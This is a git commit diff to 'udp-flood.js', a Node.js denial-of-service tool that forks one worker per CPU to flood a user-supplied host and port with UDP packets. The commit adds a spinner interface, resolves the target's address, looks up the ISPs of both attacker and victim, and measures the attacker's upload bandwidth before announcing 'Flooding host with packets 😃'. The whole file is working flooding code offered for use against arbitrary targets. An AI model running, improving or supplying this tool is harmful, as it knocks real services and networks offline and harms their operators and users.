1f81c6ee217e9738135f9906874e24c3716c09f4
GloriousYellow <yellowglorious@gmail.com>
2017-10-08 15:20:03 -0400

    Use ora logger and provide more info

--- udp-flood.js
+++ udp-flood.js
@@ -4,26 +4,26 @@ const dgram = require('dgram')
 const Commander = require('commander')
 const cluster = require('cluster')
 const os = require('os')
-const log = require('fancy-log')
-
-const setBlocking = require('set-blocking')
-
-setBlocking(true)
+const rp = require('request-promise')
+const dns = require('dns-then')
+const speedTest = require('speedtest-net')
 
 const commander = Commander
-  .option('-h, --host <host>', 'Host Name/IP.', String)
-  .option('-w, --workers <workers>', 'Number of workers to fork in the cluster, default is CPU count.', parseInt)
-  .option('-p, --port <port>', 'If not defined, program will use random ports.', parseInt)
-  .option('-d, --delay <delay>', 'Delay in ms between packet sending (per worker). Defaults to 0.', parseInt)
+  .option('-h, --host <host>', 'Target to flood (can be hostname or IP address)', String)
+  .option('-w, --workers <workers>', 'Number of workers', parseInt)
+  .option('-p, --port <port>', 'Port to send packets to', parseInt)
   .parse(process.argv)
+
+const ora = require('ora')
+
+const spinner = ora('Loading')
 
 const port = commander.port || 55555
 const workers = commander.workers || os.cpus().length + 1
 
 const client = dgram.createSocket({ type: 'udp4', reuseAddr: true })
 
-client.on('error', (err) => {
-  log(`UDP error: \n${err.stack}`)
+client.on('error', () => {
   client.close()
   process.exit(1)
 })
@@ -52,19 +52,46 @@ function runWorker() {
   )
 }
 
-if (!commander.host) {
-  log('No host specified. Exiting.')
-  process.exit()
+function testSpeed() {
+  return new Promise((resolve, reject) => {
+    const test = speedTest({
+      maxTime: 2000,
+      maxServers: 8,
+    })
+    test.on('data', resolve)
+    test.on('error', reject)
+  })
 }
 
-if (cluster.isMaster) {
-  for (let i = 0; i < workers; i += 1) {
-    log('Started worker', i + 1)
-    cluster.fork()
+async function main() {
+  if (!commander.host) {
+    spinner.fail('No host specified')
+    process.exit()
   }
-  cluster.on('exit', (worker) => {
-    log(`Worker ${worker.process.pid} died`)
-  })
-} else {
-  runWorker()
+  if (cluster.isMaster) {
+    spinner.start('Getting info')
+
+    const ip = await dns.lookup(commander.host)
+
+    const myIsp = await rp('https://ipinfo.io/org')
+    const theirIsp = await rp(`https://ipinfo.io/${ip}/org`)
+
+    spinner.info(`Route: ${myIsp.trim()} ➔ ${theirIsp.trim()}`)
+    spinner.start('Testing bandwidth')
+
+    const speed = await testSpeed()
+    spinner.info(`Bandwidth: ${speed.speeds.upload} Mbps (tested via ${speed.server.host})`)
+    spinner.start('Starting workers')
+
+    for (let i = 0; i < workers; i += 1) {
+      cluster.fork()
+    }
+
+    spinner.succeed('Started workers')
+    spinner.start('Flooding host with packets 😃')
+  } else {
+    runWorker()
+  }
 }
+
+main()
